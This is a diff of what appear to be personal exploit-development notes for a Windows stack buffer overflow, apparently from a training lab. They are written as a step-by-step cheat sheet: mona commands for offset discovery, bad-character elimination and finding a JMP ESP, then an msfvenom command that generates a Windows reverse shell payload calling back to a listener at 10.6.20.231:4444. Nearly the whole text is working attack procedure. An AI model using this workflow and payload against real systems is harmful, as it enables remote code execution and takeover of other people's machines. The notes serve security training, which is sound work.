@@ -1,7 +1,10 @@
 ```
 !mona config -set workingfolder c:\mona\%p
-!mona findmsp -distance 2500
-EIP: 2026
+/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 800
+!mona findmsp -distance 800
+EIP: 314
+#Update EIP to all scripts
+
 !mona bytearray -b "\x00"
 
 1. Send data with NULL
@@ -13,16 +16,19 @@ EIP: 2026
 
 #python bytearray.py
 # Send updated Removed Bad Char buffer to target
-!mona bytearray -b "\x00\xa9\xcd\xd4"
+!mona bytearray -b "\x00\x16\x2f\xf4\xfd"
 
 # Update Offset on Python
+"\\x00\\x16\\x2f\\xf4\\xfd"
 
-!mona jmp -r esp -cpb "\x00\xa9\xcd\xd4"
+# Verify with new ESP on Immunity Debugger
+
+!mona jmp -r esp -cpb "\x00\x16\x2f\xf4\xfd"
 !mona bytearray -b "\x00"
 
 JMP ESP: "\xaf\x11\x50\x62"
 
-msfvenom -p windows/shell_reverse_tcp LHOST=10.6.20.231 LPORT=4444 EXITFUNC=thread -b "\x00\xa9\xcd\xd4" -f py
+msfvenom -p windows/shell_reverse_tcp LHOST=10.6.20.231 LPORT=4444 EXITFUNC=thread -b "\x00\x16\x2f\xf4\xfd" -f py
 
 !mona config -set workingfolder c:\mona\%p
 
